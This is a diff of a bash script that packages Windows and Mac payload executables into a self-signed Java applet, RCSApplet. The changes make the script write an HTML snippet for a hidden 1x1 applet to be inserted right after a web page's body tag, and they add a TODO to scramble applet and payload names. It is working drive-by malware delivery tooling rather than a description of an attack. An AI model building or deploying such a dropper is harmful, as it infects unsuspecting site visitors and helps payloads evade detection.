@@ -1,32 +1,14 @@
 #!/bin/bash
-#   
-#   Shell script to sign a Java Applet   
-#   Joshua "Jabra" Abraham  <jabra@spl0it.org>
-#   Tue Jun 30 02:26:36 EDT 2009
+#   To deploy, copy .jar and .cer file to the desired web location, and insert the following snippet
+#   in the html code of the page.
+#	
+#       <applet code=RCSApplet.class archive="SignedHelloWorld.jar" width=1 height=1> 
+#			<param name='first' value='<payload>' />
+#		</applet>
+#	
+# 	change payload according to the payload name.
 #
-#   1. Compile the Applet source code to an executable class. 
-#
-#       javac HelloWorld.java
-#
-#   2. Package the compiled class into a JAR file.
-#
-#       jar cvf HelloWorld.jar HelloWorld.class
-#
-#   3. Generate key pairs. 
-#
-#       keytool -genkey -alias signapplet -keystore mykeystore -keypass mykeypass -storepass mystorepass
-#
-#   4. Sign the JAR file. 
-#
-#       jarsigner -keystore mykeystore -storepass mystorepass -keypass mykeypass -signedjar  SignedHelloWorld.jar HelloWorld.jar signapplet
-#
-#   5. Export the public key certificate. 
-#
-#       keytool -export -keystore mykeystore -storepass mystorepass -alias signapplet -file mycertificate.cer
-#
-#   6. Deploy the JAR and the class file. 
-#
-#       <applet code=HelloWorld.class archive="SignedHelloWorld.jar" width=1 height=1> </applet>
+# TODO: scramble applet and payload names
 #
 
 NAME="RCSApplet"
@@ -41,6 +23,7 @@ PAYLOAD=$1
 
 echo "[+] Using payload: $PAYLOAD"
 
+# compile the applet source code to an executable class. 
 javac $NAME.java
 if [ $? -eq 1 ] ; then
     echo "Error with javac"
@@ -48,20 +31,32 @@ if [ $? -eq 1 ] ; then
 fi
 
 echo "[+] Packaging the compiled class into a JAR file"
-jar cf $NAME.jar $NAME.class
+JAR_NAME="$NAME.jar"
+jar cf $JAR_NAME $NAME.class
 if [ $? -eq 1 ] ; then
     echo "Error with jar"
     exit
 fi
 
 echo "[+] Adding payload ($PAYLOAD) to JAR file"
-zip -u MSFcmd.jar "$PAYLOAD.exe"
-zip -u MSFcmd.jar "$PAYLOAD"
+if [ ! -f "$PAYLOAD.exe" ] ; then
+	echo "Windows payload file '$PAYLOAD.exe' does not exists."
+	exit
+fi
+
+if [ ! -f "$PAYLOAD" ] ; then
+	echo "Mac payload file '$PAYLOAD' does not exists."
+	exit
+fi
+
+zip -u $JAR_NAME "$PAYLOAD.exe"
+zip -u $JAR_NAME "$PAYLOAD"
 if [ $? -eq 1 ] ; then
     echo "Error with zip"
     exit
 fi
 
+# delete any old keystore
 if [ -f mykeystore ] ; then
 	rm mykeystore
 fi
@@ -73,8 +68,9 @@ if [ $? -eq 1 ] ; then
     exit
 fi
 
-echo "[+] Signing the JAR file"
-jarsigner -keystore mykeystore -storepass mystorepass -keypass mykeypass -signedjar  "Signed$NAME.jar" $NAME.jar signapplet
+echo "[+] Signing JAR file 'S$NAME.jar'"
+SIGNED_JAR_NAME="S$NAME.jar"
+jarsigner -keystore mykeystore -storepass mystorepass -keypass mykeypass -signedjar  $SIGNED_JAR_NAME $JAR_NAME signapplet
 if [ $? -eq 1 ] ; then
     echo "Error with signing the jar"
     exit
@@ -87,12 +83,9 @@ if [ $? -eq 1 ] ; then
     exit
 fi
 
-echo "[+] Done"
-sleep 1
-echo ""
-echo ""
-echo "Deploy the JAR and certificate files. They should be deployed to a distribution directory on a Web server. "
-echo ""
-echo "<applet width='1' height='1' code=$NAME.class archive="Signed$NAME.jar"> </applet>" 
-echo ""
+echo "[+] Writing html snippet, to be inserted right after the <body> tag"
 
+echo "<applet width='1' height='1' code=RCSApplet archive=$SIGNED_JAR_NAME >" > snippet.html
+echo "<param name='first' value='$PAYLOAD'/></applet>" >> snippet.html
+
+echo "[+] Done"
